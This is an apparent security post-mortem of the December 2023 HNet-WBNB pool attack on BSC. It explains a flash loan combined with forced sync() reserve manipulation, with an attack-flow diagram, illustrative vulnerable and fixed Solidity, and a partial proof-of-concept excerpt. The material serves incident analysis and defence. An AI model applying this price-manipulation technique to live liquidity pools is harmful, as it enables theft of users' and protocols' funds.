# HNet Price Manipulation Vulnerability Analysis (December 2023)

## Metadata

| Field | Details |
|------|------|
| Date | 2023-12-12 |
| Protocol | HNet |
| Chain | BSC |
| Loss | ~2.4 WBNB |
| Attacker | 0x835b45d38cbdccf99e609436ff38e31ac05bc502 |
| Attack Tx | 0x1ee617cd739b1afcc673a180e60b9a32ad3ba856226a68e8748d58fcccc877a8 |
| Vulnerable Contract | 0x0dabdc92af35615443412a336344c591faed3f90 |
| Root Cause | Forced `sync()` call updates reserves to match manipulated balances, distorting the spot price and enabling arbitrage profit |
| PoC Source | https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/HNet_exp.sol |

---

## 1. Vulnerability Overview

The HNet-WBNB liquidity pool was attacked on the same day, by the same attacker (0x835b...), using the same method as DominoTT. By combining a DODO flash loan with the `sync()` function for price manipulation, approximately 2.4 WBNB was drained.

---

## 2. Vulnerable Code Analysis

### ❌ Vulnerable Code
```solidity
interface IHNetTOWBNB {
    // sync() publicly exposed — force-updates reserves
    function sync() external;
}

// Price calculation is reserve-based
function getPrice() external view returns (uint256) {
    (uint112 r0, uint112 r1,) = pair.getReserves();
    // After sync(), computed using manipulated reserves
    return uint256(r1) * 1e18 / uint256(r0);
}
```

### ✅ Fixed Code
```solidity
// TWAP-based price to prevent manipulation
function getPrice() external view returns (uint256) {
    return twapOracle.consult(hnetToken, 1e18);
}
```

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: forced sync() call updates reserves to match manipulated balances,
// distorting the spot price and enabling arbitrage profit
// Source code unverified — based on bytecode analysis
```

---

## 3. Attack Flow

```
Attacker (same pattern as DominoTT)
  │
  ├─▶ DODO DPP Advanced flash loan
  │    └─▶ Borrow large amount of WBNB
  │
  ├─▶ Transfer WBNB directly to HNet-WBNB pool
  │
  ├─▶ Call sync()
  │    └─▶ Force-update reserves → price distortion
  │
  ├─▶ Swap at manipulated price
  │
  └─▶ 2.4 WBNB profit (alongside DominoTT in the same Tx)
```

---

## 4. PoC Code (Key Sections)

```solidity
function testExploit() external {
    // Executed in the same attack transaction as DominoTT
    // Tx: 0x1ee617cd...

    // DODO flash loan → transfer WBNB → sync() → swap
    IDPPAdvanced(dppAdvanced).flashLoan(
        wbnbAmount, 0, address(this), abi.encode("exploit")
    );
}

function DPPFlashLoanCall(address, uint256 baseAmount, uint256, bytes calldata) external {
    // Manipulate HNet pool price
    WBNB.transfer(address(hnetPool), baseAmount / 3);
    IHNetTOWBNB(hnetPool).sync();
    // 2.4 WBNB profit
}
```

---

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| Vulnerability Type | Flash loan + `sync()` price manipulation |
| Attack Vector | DODO flash loan + direct transfer |
| Impact Scope | HNet-WBNB pool |
| Severity | Low |

---

## 6. Remediation Recommendations

1. **`sync()` Protection**: Detect large single-block reserve changes
2. **TWAP Oracle**: Remove dependence on spot price
3. **Forked Protocol Security**: Share security patches across codebases that use the same code

---

## 7. Lessons Learned

HNet and DominoTT were attacked on the same day, by the same attacker, using the same method. Protocols sharing an identical code pattern or fork must immediately audit all instances the moment one is exploited. Automated attack bots simultaneously scan for and exploit protocols that share the same vulnerability.